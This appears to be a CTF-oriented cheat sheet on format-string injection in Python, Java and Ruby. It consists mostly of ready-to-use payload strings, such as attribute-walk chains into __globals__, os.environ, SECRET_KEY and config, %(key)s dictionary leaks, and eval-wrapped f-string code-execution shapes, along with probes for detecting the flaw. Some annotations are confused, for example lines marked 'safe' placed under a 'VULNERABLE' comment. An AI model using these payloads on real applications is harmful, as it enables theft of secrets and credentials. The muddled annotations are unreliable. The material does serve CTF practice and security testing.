# Format-string injection — the SSTI-adjacent class

Not template engines — Python `format`/f-string/`%`-format and
similar reaching attacker input. Smaller surface than Jinja but
enough to leak objects, and it fools people who tested `{{}}`
only.

---

## 1. Python `str.format` — the `.format` vuln

```python
"Hello {name}".format(name=user_input)     # safe — input is VALUE
"Hello {}".format(user_input)               # safe
f"Hello {user_input}"                        # safe — still a VALUE

# VULNERABLE — input IS the format string:
user_input.format(...)                        # user controls TEMPLATE
"Hi {x}".format(x=user_input)                 # safe
f"Hi {request.args.fmt}"                       # same — value
app_string.format(**request.args)              # PARAMS → format-map!
log_format.format(event)                        # event keys → {attr}?
```

The REAL vuln: `"...{x}...".format(x=user_input)` where the
TEMPLATE STRING is fixed but `x` is an OBJECT whose attributes
the input can name:

```python
"Hello {user.name}!".format(user=user)
   — name is FIXED here — not the bug
```

vs the true shape:

```python
fmt = "Hello {%s}" % field          # field = 'user.password'!
fmt.format(user=user)
   → {user.password} resolves attributes → LEAK
```

Or `"...{0[a]}...".format(d)` — the `[a]` index-notation:

```text
{0.__class__}            → attr access
{0[secret]}              → dict-key access
{0.__class__.__init__.__globals__}  → globals — sandbox escape!
{0.config}               → attr chain
{user.password}          → bound-object attr
{user.__class__}         → class
{user.__init__.__globals__[flag]}    → flag direct
{user.__init__.__globals__[os][environ]}
```

`{obj.attr}`/`{obj[key]}` inside the format-string RESOLVES —
format's field-accessor walks attributes AND items.

## 2. f-string — the eval-adjacent one

```python
name = request.args['n']
f"Hello {name}"                 # SAFE — name is a value
f"Hello {eval(name)}"            # NOT f-string's fault — eval
```

f-strings compile at DEFINITION time — user input inside an
f-string is data. The bug is `eval`/`exec` on it, or the input
BECOMING the f-string:

```python
eval(f'f"Hello {{{user_input}}}"')   # input becomes code → RCE
exec(f'x = f"{user_input}"')
```

## 3. `%`-format — the C-style one

```python
"Hello %s" % user_input         # safe — value
user_input % args                # INPUT IS FORMAT — the bug:
   "%(__class__)s" % x           → map-format with attr?
   "%(key)s" % d                 → dict-key lookup — LEAK KEYS
```

`%(key)s` — named-map format — the input FORMAT names which dict
key to emit → `%(secret)s` leaks `d['secret']`. And `%` on a
non-mapping errors → leaks the type via the exception.

## 4. The attribute-walk chain — the deep reach

```text
{0.__class__}                       → class of arg0
{0.__class__.__bases__}
{0.__class__.__mro__}
{0.__class__.__init__.__globals__}  → MODULE GLOBALS — the door
{0.__class__.__init__.__globals__[os]}
{0.__class__.__init__.__globals__[__builtins__]}
{0.__class__.__init__.__globals__[__builtins__][open]}  → call? NO —
                                   format CAN'T call () — READ-only
{0.__init__.__globals__[FLAG]}
{0.__init__.__globals__[config]}
{0.__init__.__globals__[SECRET_KEY]}
```

CRITICAL LIMIT: format-specifiers can't CALL functions — no `()`.
So the escape gives READ access to objects/globals — enough for
flag-in-globals, config, env — NOT enough for exec. That changes
the exploitation: read-side only.

## 5. The spec-format mini-language — `{x:spec}`

```text
{0:{1}}            → nested field — second arg as SPEC → recursion
{0:{width}}        → width from another arg — indirection
{0:>{pad}}         → pad char from arg → info-leak gadgets
{0:*>50}           → pad — fill char ' ' used to leak internals?
```

The `{0:{1}}` nested-spec — the FORMAT SPEC ITSELF is a field —
double-lookup → sometimes reaches things the outer field can't.

## 6. Java `String.format`/`MessageFormat`

```java
String.format(userInput, args)      → %s %d %n — no attr-walk
MessageFormat.format("{0}", x)      → {0} index only
// BUT — the format-EXCEPTION leaks the arg toString
// and %n injects newlines — log-injection vector
```

Java format-strings lack the attribute-walk — limited to arg
positions + type-coercion. The `%` crash → stack-trace → arg
leak is the practical surface.

## 7. Ruby `sprintf`/format + `#{...}`

```ruby
sprintf(user_input, x)          → %s etc — no attr-walk
"#{user_input}"                  → input is VALUE — safe
eval("\"#{user_input}\"")        → input becomes code — eval-bug
```

Ruby `#{...}` inside a DOUBLE-QUOTED string evaluates — if the
app builds the string with the input pre-interpolated into an
eval'd string — that's code-eval not format-bug.

## 8. What format-bugs actually give you

```text
CAN:   read object attrs, dict keys, globals contents, env, config
       → flag in any readable slot
CANNOT: call functions, exec, write files — no () in format spec
EXCEPT: the spec-language recursion + the (..)s map-key trick —
        and the attr-walk to a BOUND function you then can't call
        but whose __globals__ you read — globals DO contain values
```

So format-injection = a READ oracle over the bound objects —
enough whenever the flag is IN the namespace (the CTF norm).

## 9. Detection — the format-probe

```text
{x} probe:     "{0}" or "{x}" in input → literal? resolved?
{x.__class__}: resolves → Python-format confirmed
%(...)s probe: "%(x)s" → key-error (leaks dict) vs literal
{{}} probe negative + {} positive → format-string NOT Jinja
   — this is the discrimination: {{7*7}} literal BUT {0} resolves
     → format-injection, NOT template-injection
```

The false-positive trap: `{x}` unresolved in output looks like
`{x}` literal — try `{0.__class__}` — a real format-path resolves
it to `<class 'dict'>` or similar.
